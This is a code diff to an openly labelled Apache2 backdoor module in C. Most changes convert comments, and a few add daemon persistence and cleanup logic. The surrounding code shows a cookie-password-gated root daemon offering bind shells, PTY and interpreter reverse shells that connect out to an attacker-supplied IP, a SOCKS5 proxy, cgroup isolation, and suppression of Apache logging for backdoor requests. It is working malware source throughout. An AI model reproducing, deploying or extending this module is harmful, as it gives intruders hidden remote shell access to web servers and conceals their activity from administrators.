@@ -1,6 +1,6 @@
-/* ------------------------------------*/
-/* Apache2 Backdoor module (@RicoVlad) */
-/* ------------------------------------*/
+// ------------------------------------
+// Apache2 Backdoor module (@RicoVlad) 
+// ------------------------------------
 /*
  * Forks a root daemon on config load, exposing backdoor features via HTTP
  * endpoints (bind shell, reverse shell, SOCKS5 proxy, ping). Uses a Unix-domain
@@ -24,8 +24,12 @@
 #include <sys/stat.h>
 #include <sys/un.h>
 
-#include <pty.h>    /* forkpty() - link with -lutil */
+#include <pty.h>    // forkpty() - link with -lutil 
 #include <sys/mount.h>
+
+#ifdef NO_SYSTEMD
+#include <sys/prctl.h>
+#endif
 
 #include "httpd.h"
 #include "http_config.h"
@@ -36,9 +40,9 @@
 
 #include "socks.h"
 
-/* ------------------------------------------------------------------ */
-/* Constants                                                          */
-/* ------------------------------------------------------------------ */
+// ------------------------------------------------------------------ 
+// Constants                                                          
+// ------------------------------------------------------------------ 
 
 #define PASSWORD      "password=backdoor"
 #define SOCKSWORD     "/proxy"
@@ -54,12 +58,12 @@
 #define IPC           "/tmp/mod_backdoor"
 #endif
 
-/* PID of the forked IPC daemon (set in backdoor_post_config) */
+// PID of the forked IPC daemon (set in backdoor_post_config) 
 pid_t pid;
 
-/* ------------------------------------------------------------------ */
-/* URI parsing types and functions                                    */
-/* ------------------------------------------------------------------ */
+// ------------------------------------------------------------------ 
+// URI parsing types and functions                                    
+// ------------------------------------------------------------------ 
 
 typedef enum {
     CMD_PING,
@@ -109,7 +113,7 @@ static int parse_uri(const char *uri, parsed_cmd_t *out) {
         break;
 
     case CMD_SOCKS: {
-        strtok(copy, "/");  /* skip "proxy" */
+        strtok(copy, "/");  // skip "proxy" 
         char *port = strtok(NULL, "/");
         if (!port) { free(copy); out->type = CMD_UNKNOWN; return -1; }
         out->port = safe_strdup(port);
@@ -120,7 +124,7 @@ static int parse_uri(const char *uri, parsed_cmd_t *out) {
     }
 
     case CMD_BIND: {
-        strtok(copy, "/");  /* skip "bind" */
+        strtok(copy, "/");  // skip "bind" 
         char *port = strtok(NULL, "/");
         if (!port) { free(copy); out->type = CMD_UNKNOWN; return -1; }
         out->port = safe_strdup(port);
@@ -129,7 +133,7 @@ static int parse_uri(const char *uri, parsed_cmd_t *out) {
     }
 
     case CMD_REVSHELL: {
-        strtok(copy, "/");  /* skip "reverse" */
+        strtok(copy, "/");  // skip "reverse" 
         char *ip = strtok(NULL, "/");
         char *port = strtok(NULL, "/");
         char *prog = strtok(NULL, "/");
@@ -142,7 +146,7 @@ static int parse_uri(const char *uri, parsed_cmd_t *out) {
     }
 
     case CMD_REVTY: {
-        strtok(copy, "/");  /* skip "revtty" */
+        strtok(copy, "/");  // skip "revtty" 
         char *ip = strtok(NULL, "/");
         char *port = strtok(NULL, "/");
         if (!ip || !port) { free(copy); out->type = CMD_UNKNOWN; return -1; }
@@ -170,9 +174,9 @@ static void free_parsed_cmd(parsed_cmd_t *cmd) {
     memset(cmd, 0, sizeof(*cmd));
 }
 
-/* ------------------------------------------------------------------ */
-/* Reverse shell helpers                                              */
-/* ------------------------------------------------------------------ */
+// ------------------------------------------------------------------ 
+// Reverse shell helpers                                              
+// ------------------------------------------------------------------ 
 
 /*
  * Spawn a TTY reverse shell. Forks a child that connects to (ip:port),
@@ -184,7 +188,7 @@ static void shell(char *ip, char *port, char *prog) {
     if (spid < 0) exit(0);
     if (spid != 0) { exit(0); }
 
-    /* Child process */
+    // Child process 
     #ifdef NO_SYSTEMD
     char *argv[] = { "sh", 0 };
     #else
@@ -208,7 +212,7 @@ static void shell(char *ip, char *port, char *prog) {
     dup2(revsockfd, 1);
     dup2(revsockfd, 2);
 
-    /* execve never returns on success */
+    // execve never returns on success 
     if (!strcmp(prog, "sh"))    execve("/bin/sh", argv, envp);
     if (!strcmp(prog, "bash"))  execve("/bin/bash", argv, envp);
     if (!strcmp(prog, "dash"))  execve("/bin/dash", argv, envp);
@@ -223,7 +227,7 @@ static void shell(char *ip, char *port, char *prog) {
  * a one-liner that opens a socket and execs /bin/sh.
  */
 static void reverseShell(char *ip, char *port, char *prog) {
-    /* Delegate TTY shells to the pty-based handler */
+    // Delegate TTY shells to the pty-based handler 
     if (!strcmp(prog, "sh") || !strcmp(prog, "bash") || !strcmp(prog, "dash") ||
         !strcmp(prog, "tcsh") || !strcmp(prog, "ash") || !strcmp(prog, "ksh")) {
         shell(ip, port, prog);
@@ -237,7 +241,7 @@ static void reverseShell(char *ip, char *port, char *prog) {
     }
     if (spid != 0) { exit(0); }
 
-    /* Child process - interpreter-based reverse shells */
+    // Child process - interpreter-based reverse shells 
     if (!strcmp(prog, "php")) {
         char *args[] = {"/usr/bin/php", "-r", "", NULL};
         args[2] = malloc(strlen("$sock=fsockopen(\"%s\",%s);exec(\"/bin/sh -i <&3 >&3 2>&3\");")+strlen(ip)+strlen(port)+1);
@@ -261,9 +265,9 @@ static void reverseShell(char *ip, char *port, char *prog) {
     }
 }
 
-/* ------------------------------------------------------------------ */
-/* Pseudo-terminal reverse shell                                      */
-/* ------------------------------------------------------------------ */
+// ------------------------------------------------------------------ 
+// Pseudo-terminal reverse shell                                      
+// ------------------------------------------------------------------ 
 
 /*
  * TTY reverse shell using forkpty. Forks a child with a pseudo-terminal,
@@ -283,7 +287,7 @@ static void shellPTY(int socket) {
     }
 
     if (fpid == 0) {
-        /* Child: exec a shell on the pty slave */
+        // Child: exec a shell on the pty slave 
       #ifdef NO_SYSTEMD
       char *argv[] = { "sh", 0 };
       #else
@@ -293,7 +297,7 @@ static void shellPTY(int socket) {
       execve("/bin/sh", argv, envp);
     }
 
-    /* Parent: configure terminal, then relay data */
+    // Parent: configure terminal, drain pty garbage, then relay 
     tcgetattr(terminalfd, &terminal);
     terminal.c_lflag &= ~ECHO;
     tcsetattr(terminalfd, TCSANOW, &terminal);
@@ -320,9 +324,9 @@ static void shellPTY(int socket) {
     exit(0);
 }
 
-/* ------------------------------------------------------------------ */
-/* Bind shell helpers                                                 */
-/* ------------------------------------------------------------------ */
+// ------------------------------------------------------------------ 
+// Bind shell helpers                                                 
+// ------------------------------------------------------------------ 
 
 /*
  * Bind a TCP port and return the listening socket fd. Sends error
@@ -359,9 +363,9 @@ static int bindPort(int client_fd, int port) {
     return bindSock;
 }
 
-/* ------------------------------------------------------------------ */
-/* IPC relay                                                          */
-/* ------------------------------------------------------------------ */
+// ------------------------------------------------------------------ 
+// IPC relay                                                          
+// ------------------------------------------------------------------ 
 
 /*
  * Bidirectional data relay between two file descriptors using select().
@@ -374,7 +378,7 @@ static void bicomIPC(int sock, int revsockfd) {
         FD_ZERO(&readset);
         FD_SET(sock, &readset);
         FD_SET(revsockfd, &readset);
-        /* select <= 0: timeout or error (EINTR) - just retry */
+        // select <= 0: timeout or error (EINTR) - just retry 
         if (select(sock + 1, &readset, NULL, NULL, NULL) <= 0) continue;
         if (FD_ISSET(sock, &readset)) {
             int n = read(sock, buf, sizeof buf);
@@ -389,11 +393,11 @@ static void bicomIPC(int sock, int revsockfd) {
     }
 }
 
-/* ------------------------------------------------------------------ */
-/* Apache connection helpers                                          */
-/* ------------------------------------------------------------------ */
+// ------------------------------------------------------------------ 
+// Apache connection helpers                                          
+// ------------------------------------------------------------------ 
 
-/* Extract the raw socket fd from the Apache request connection */
+// Extract the raw socket fd from the Apache request connection 
 static int get_client_fd(request_rec *r) {
     apr_os_sock_t os_fd;
     apr_socket_t *sock = ap_get_conn_socket(r->connection);
@@ -402,7 +406,7 @@ static int get_client_fd(request_rec *r) {
     return (int)os_fd;
 }
 
-/* Connect to the IPC daemon's Unix domain socket */
+// Connect to the IPC daemon's Unix domain socket 
 static int connect_ipc(void) {
     int sock = socket(AF_UNIX, SOCK_STREAM, 0);
     if (sock < 0) return -1;
@@ -416,16 +420,16 @@ static int connect_ipc(void) {
     return sock;
 }
 
-/* Send error response, close the socket, and exit the process */
+// Send error response, close the socket, and exit the process 
 static void send_error_to_client(int fd, const char *msg) {
     write(fd, msg, strlen(msg));
     close(fd);
     exit(0);
 }
 
-/* ------------------------------------------------------------------ */
-/* HTTP request handlers                                              */
-/* ------------------------------------------------------------------ */
+// ------------------------------------------------------------------ 
+// HTTP request handlers                                              
+// ------------------------------------------------------------------ 
 
 /*
  * SOCKS5 proxy handler. Forwards the URI to the IPC daemon which
@@ -480,7 +484,7 @@ static void handle_bind_request(request_rec *r, int client_fd) {
     free_parsed_cmd(&cmd);
 }
 
-/* Health check endpoint */
+// Health check endpoint 
 static void handle_ping_request(int client_fd) {
     write(client_fd, "[+] Backdoor module is running !\n",
           strlen("[+] Backdoor module is running !\n"));
@@ -562,9 +566,9 @@ static void handle_revtty_request(request_rec *r, int client_fd) {
     exit(0);
 }
 
-/* ------------------------------------------------------------------ */
-/* Apache hook: post-read-request                                     */
-/* ------------------------------------------------------------------ */
+// ------------------------------------------------------------------ 
+// Apache hook: post-read-request                                     
+// ------------------------------------------------------------------ 
 
 /*
  * Intercepts every HTTP request. Checks for the password cookie,
@@ -616,9 +620,18 @@ static int backdoor_post_read_request(request_rec *r) {
     return DECLINED;
 }
 
-/* ------------------------------------------------------------------ */
-/* IPC daemon management                                              */
-/* ------------------------------------------------------------------ */
+// ------------------------------------------------------------------ 
+// IPC daemon management                                              
+// ------------------------------------------------------------------ 
+
+#ifdef NO_SYSTEMD
+// Clean up IPC socket and exit when parent Apache dies (PDEATHSIG) 
+static void backdoor_daemon_cleanup(int sig) {
+    (void)sig;
+    unlink(IPC);
+    exit(0);
+}
+#endif
 
 /*
  * Move the daemon process into its own cgroup2 to isolate it from
@@ -675,14 +688,14 @@ static int waitIPC(int master) {
                 continue;
             }
 
-            /* Fork handler for this request */
+            // Fork handler for this request 
             pid_t handler = fork();
             if (handler == 0) {
                 if (strstr(buf, "SHELL") || strstr(buf, "BIND")) {
                     rmCgroup();
                     shellPTY(sd);
                 } else {
-                    /* Parse URI from IPC message */
+                    // Parse URI from IPC message 
                     parsed_cmd_t cmd;
                     if (parse_uri(buf, &cmd) == 0) {
                         if (cmd.type == CMD_REVSHELL) {
@@ -696,7 +709,7 @@ static int waitIPC(int master) {
                 }
                 exit(0);
             }
-            /* Parent: fork a new acceptor to keep listening */
+            // Parent: fork a new acceptor to keep listening 
             pid_t acceptor = fork();
             if (acceptor == 0) {
                 waitIPC(master);
@@ -707,9 +720,9 @@ static int waitIPC(int master) {
     }
 }
 
-/* ------------------------------------------------------------------ */
-/* Apache hook: post-config (daemon fork)                             */
-/* ------------------------------------------------------------------ */
+// ------------------------------------------------------------------ 
+// Apache hook: post-config (daemon fork)                             
+// ------------------------------------------------------------------ 
 
 /*
  * Fork the IPC daemon. Parent returns immediately; child creates a
@@ -720,6 +733,14 @@ int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp,
     if (pid > 0) {
         return OK;
     }
+
+#ifdef NO_SYSTEMD
+    // When parent Apache dies, kernel sends SIGTERM to daemon 
+    prctl(PR_SET_PDEATHSIG, SIGTERM);
+    signal(SIGTERM, backdoor_daemon_cleanup);
+#endif
+
+    unlink(IPC);
 
     int master, rc;
     struct sockaddr_un serveraddr;
@@ -738,9 +759,9 @@ int backdoor_post_config(apr_pool_t *pconf, apr_pool_t *plog, apr_pool_t *ptemp,
     waitIPC(master);
 }
 
-/* ------------------------------------------------------------------ */
-/* Apache hook: log-transaction                                       */
-/* ------------------------------------------------------------------ */
+// ------------------------------------------------------------------ 
+// Apache hook: log-transaction                                       
+// ------------------------------------------------------------------ 
 
 /*
  * Suppress Apache logging for backdoor requests. Also kills the
@@ -763,9 +784,9 @@ static int backdoor_log_transaction(request_rec *r) {
     return DECLINED;
 }
 
-/* ------------------------------------------------------------------ */
-/* Apache hook: register hooks                                        */
-/* ------------------------------------------------------------------ */
+// ------------------------------------------------------------------ 
+// Apache hook: register hooks                                        
+// ------------------------------------------------------------------ 
 
 static void backdoor_register_hooks(apr_pool_t *p) {
     ap_hook_post_read_request(backdoor_post_read_request, NULL, NULL, APR_HOOK_FIRST);
@@ -773,16 +794,16 @@ static void backdoor_register_hooks(apr_pool_t *p) {
     ap_hook_log_transaction(backdoor_log_transaction, NULL, NULL, APR_HOOK_FIRST);
 }
 
-/* ------------------------------------------------------------------ */
-/* Module definition                                                  */
-/* ------------------------------------------------------------------ */
+// ------------------------------------------------------------------ 
+// Module definition                                                  
+// ------------------------------------------------------------------ 
 
 module AP_MODULE_DECLARE_DATA backdoor_module = {
     STANDARD20_MODULE_STUFF,
-    NULL,                 /* create per-dir config    */
-    NULL,                 /* merge per-dir config     */
-    NULL,                 /* create per-server config */
-    NULL,                 /* merge per-server config  */
-    NULL,                 /* config file commands     */
-    backdoor_register_hooks /* register hooks         */
+    NULL,                 // create per-dir config    
+    NULL,                 // merge per-dir config     
+    NULL,                 // create per-server config 
+    NULL,                 // merge per-server config  
+    NULL,                 // config file commands     
+    backdoor_register_hooks // register hooks         
 };
